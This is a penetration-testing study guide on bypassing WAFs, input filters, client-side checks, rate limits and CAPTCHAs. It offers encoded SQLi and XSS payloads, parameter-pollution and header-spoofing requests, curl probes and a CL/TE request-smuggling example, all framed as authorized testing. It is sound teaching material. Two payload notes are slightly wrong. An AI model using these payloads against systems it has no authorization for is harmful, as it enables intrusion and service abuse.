# Bypass Techniques — eWPTX Methodology Phase 3

> eWPTX study guide · Advanced web methodology — INE-Cybersecurity-Certifications-Guide

Filters, WAFs, rate limits, CAPTCHAs, and client-side checks are controls,
not walls. Before you can exploit the underlying bug you must get your
payload past the control *without* triggering a block. This phase is about
understanding **why** a control matches, then choosing the bypass that
exploits the mismatch between what the filter sees and what the backend
interprets. Everything here assumes an authorized target and responsible
testing (no DDoS-style brute force against rate limits you do not own).

## Bypass mindset: find the parser mismatch

Almost every bypass works because **two parsers disagree**. The WAF decodes
once, the application decodes again; the WAF sees one host, the backend
another. Before trying payloads, model the request path:

```text
client -> CDN/WAF (parse #1) -> reverse proxy (parse #2) -> app server (parse #3)
```

Ask: which layer decodes URL encoding? Which header wins a duplicate? Which
charset does each assume? The bypass lives in the gaps between answers.

## WAF/IPS and filter bypass

**Encoding and obfuscation** — if the backend decodes more times than the WAF:

```sql
-- Classic SQLi encoded multiple ways (each is one payload family)
' OR 1=1-- -          # plain (usually caught first)
%27%20OR%201%3D1--    # URL-encoded once
%2527 OR 1=1--        # double-encoded: WAF sees %25..., backend decodes twice
' OR 1=1-- -          # with comments/tabs injected between tokens: '/**/OR/**/1=1
concat(0x27,0x6f72)   # hex / char() for literals when quotes are filtered
```

**Case and keyword tricks** (when the filter is a case-sensitive regex, or
only strips one variant):

```text
<ScRiPt>alert(1)</ScRiPt>     # mixed case
<scr<script>ipt>              # nested tag: filter strips inner -> outer survives
<img src=x onerror=alert(1)>  # alternate XSS vectors when <script> is blocked
javascript&#58;alert(1)        # HTML entities in attributes
```

**Whitespace and comments** where tokens must be separated — `%09`, `%0a`,
`/**/`, and newline tricks split signatures:

```bash
# Fuzz which separators the filter lets through (authorized target, small set)
for sep in '%09' '%0a' '%0d' '/**/' '+'; do
  curl -s "https://example.com/search?q=1$sep%20OR%20$sep%201=1" -o /dev/null -w "$sep -> %{http_code}\n"
done
```

**HTTP parameter pollution (HPP)** — the WAF checks one value, the backend
joins/keeps another:

```http
GET /login?user=admin&user=administrator&pass=guess HTTP/1.1
# Asp.Net joins with comma; PHP keeps the LAST; Java/Node often the FIRST.
# If the WAF validates user=administrator (clean) but the app uses the last
# occurrence (user=admin), the filter checked a value the app never used.
```

Always confirm **which occurrence the framework uses** before building the
payload, then test the same parameter twice.

## Client-side control bypass

Client-side validation is UX, not security — the server must re-validate.
Bypasses are trivial by design:

- **Disable JavaScript** or intercept and rewrite it in the browser before it
  runs.
- **Edit requests in the proxy**: maxlength, `disabled`, `hidden`, and
  `type=email/number` fields never reach the server anyway — change values in
  transit (Burp Repeater/Decoder).
- **Call the API directly**, skipping the page that "protects" it.
- **Tamper with client-side state**: role flags in `localStorage` or cookies
  are advisory; replay with `role=admin` and watch whether the server
  enforces anything.
- **Replay signed client decisions** (price, step counters, `finalStep=true`)
  and compare server-side totals.

```bash
# Example: a "price" field hidden in JS — send your own value via curl
curl -s -b "session=$SID" -X POST https://shop.example.com/api/checkout \
  -H 'Content-Type: application/json' \
  -d '{"item":"laptop","price":0.01,"qty":1}'   # server must reject, not trust
```

The finding is only real when the **server** acts on the tampered value — a
client check that is duplicated server-side is not a vulnerability.

## Rate-limit and CAPTCHA bypass concepts

Rate limits and CAPTCHAs protect login, OTP, and enumeration endpoints. Test
them as logic, not as walls to demolish:

- **Scope of the limit**: is it per IP, per session, per account, per
  header? Rotate the dimension that is *not* counted:
  `X-Forwarded-For: 1.2.3.4` spoofing works only if the app trusts it
  (check by sending two different values and watching the counter).
- **Header-based counting bypass**: adding `X-Forwarded-For` or
  `X-Real-IP` with fresh values resets an IP counter on misconfigured apps.
- **Method/endpoint variance**: the limit may apply only to `POST /login`;
  try `PUT`, case variants, or a trailing slash (`/login/`) if routing
  normalizes them to the same handler.
- **CAPTCHA replay / bypass**: a CAPTCHA token is often valid for N
  requests or never tied to the session — replay the same token, or skip it
  on endpoints that forgot to require it (the API path vs. the web path).

```bash
# Detect whether the counter is IP-based (always confirm the header is trusted
# by observing the block count move; never hammer real infrastructure)
curl -s -X POST https://example.com/login \
  -H 'X-Forwarded-For: 203.0.113.99' -d 'user=admin&pass=wrong' -o /dev/null -w '%{http_code}\n'
```

Ethical line: verify the control *can* be bypassed with a few requests; do
not brute-force credentials or run thousands of OTP guesses against a live
limit you are not authorized to exhaust.

## Header and parsing discrepancies

**Host / absolute-URL tricks** — a WAF rules on the host while the backend
trusts the URL or a header:

```http
GET https://example.com/admin HTTP/1.1          # normal
GET http://internal-admin/ HTTP/1.1             # absolute-form target switch
Host: example.com
X-Forwarded-Host: internal-admin                # app builds links from this
```

**Duplicate/obfuscated headers** for cache and routing confusion:

```http
X-Forwarded-For: 127.0.0.1        # "internal" access decisions
X-Forwarded-For: 127.0.0.1, 8.8.8.8   # proxy chains: which hop is trusted?
X-Original-URL: /admin             # some proxies route on X-Original-URL
X-Rewrite-URL: /admin
```

**Request smuggling (concept)** — front-end and back-end disagree on where a
request ends (`Content-Length` vs `Transfer-Encoding`), so the smuggled
bytes become the *start* of the next victim's request. The classic proof is
a "poisoned" next request:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4            # front-end trusts CL, back-end TE

0

GET /admin HTTP/1.1
X: 
```

If the *next* request on the same connection returns `/admin` content, the
front/back split is confirmed. Only test this on targets you own — it
poisons shared connections and can affect other users.

**Unicode and charset confusion** for filter evasion:

```text
%u0027        # IIS-style unicode escape for '
¼ or ½        # full-width characters where filters are byte-naive
UTF-7 in <meta charset> pages (legacy IE) — mostly historical, know it exists
```

**JSON vs form vs XML**: the WAF inspects `application/x-www-form-urlencoded`
but the endpoint also accepts JSON (`application/json`) or XML — resend the
same attack in the content type the WAF does not parse:

```bash
curl -s -X POST https://example.com/search -H 'Content-Type: application/json' \
  -d '{"q": "<script>alert(1)</script>"}'     # JSON-encoded XSS probe
```

## Recording and reporting bypasses

Bypasses belong in the report as **evidence of control weakness**, always
paired with the underlying bug:

```text
Control: WAF blocks ' OR 1=1 in query strings (403).
Bypass:  double URL-encoding (%2527) reached the backend and returned a
         SQL error banner on /search (request 7, response excerpt).
Root issue: WAF decodes once; app server decodes twice.
Impact: filter can be bypassed for the SQLi family -> severity of SQLi +1
```

Be careful about what you claim: a bypass that works on *your* payload
family does not mean the WAF is useless — state the tested scope precisely.

## Common Mistakes & Tips

- **Fuzzing blindly.** Understand which parser layer you are attacking and
  decode once more than the filter does; random payload spam teaches little.
- **Confusing "no block" with "exploited".** A payload that is not blocked
  still needs to prove the *underlying* bug fires.
- **Spoofing headers the app ignores.** Always verify `X-Forwarded-*` is
  actually trusted before claiming an IP-based limit bypass.
- **Ignoring content-type switching.** JSON/XML endpoints routinely bypass
  filters tuned for form data.
- **Playing with smuggling on shared infrastructure.** Connection poisoning
  affects other users; restrict to owned targets.
- **Forgetting that client-side is only the start.** Prove server-side
  impact or drop the finding.
- **Over-claiming WAF bypass scope.** Report exactly which families and
  endpoints were tested.

## Checklist / Self-Test

- [ ] I can explain the parser-mismatch principle behind most bypasses.
- [ ] I can craft encoding, case, comment, and whitespace variants of a
      blocked payload and test them methodically.
- [ ] I understand HTTP parameter pollution and know how to confirm which
      duplicate value the backend keeps.
- [ ] I can bypass client-side validation via the proxy/API and prove
      server-side impact.
- [ ] I can identify the counted dimension of a rate limit (IP/session/
      account/header) and test a bypass without abusing the endpoint.
- [ ] I can explain request-smuggling root cause (CL/TE disagreement) and
      describe a safe proof-of-concept.
- [ ] I retest blocked payloads across content types (form/JSON/XML) and
      header variants (X-Forwarded-*, X-Original-URL).
- [ ] I document each bypass as evidence tied to an underlying finding, with
      tested scope stated.

## Further Resources

- OWASP Web Security Testing Guide — input validation and WAF testing:
  https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Research — request smuggling research and tooling:
  https://portswigger.net/research
- PortSwigger Web Security Academy — request smuggling and client-side labs:
  https://portswigger.net/web-security
- OWASP Cheat Sheet Series — input validation, XSS prevention:
  https://cheatsheetseries.owasp.org/
- OWASP WAF Testing/Evasion resources (wiki): https://owasp.org/www-community/
- RFC 9112 (HTTP/1.1 messaging — CL/TE rules): https://www.rfc-editor.org/rfc/rfc9112
